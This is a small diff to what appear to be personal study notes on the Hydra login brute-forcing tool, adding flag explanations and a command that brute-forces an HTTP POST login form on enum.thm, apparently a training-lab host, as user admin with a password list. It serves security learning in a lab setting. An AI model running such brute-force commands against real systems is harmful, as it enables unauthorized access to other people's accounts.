@@ -20,3 +20,7 @@ example of a http login:
 -V -> verbose (shows each attempt)
 -f -> stop after first valid login
 -s -> specify port
+
+
+Real life example - 
+hydra -l admin -P pass.txt enum.thm http-post-form "/labs/basic_auth/:username=^USER^&password=^PASS^:F=Unauthorized"
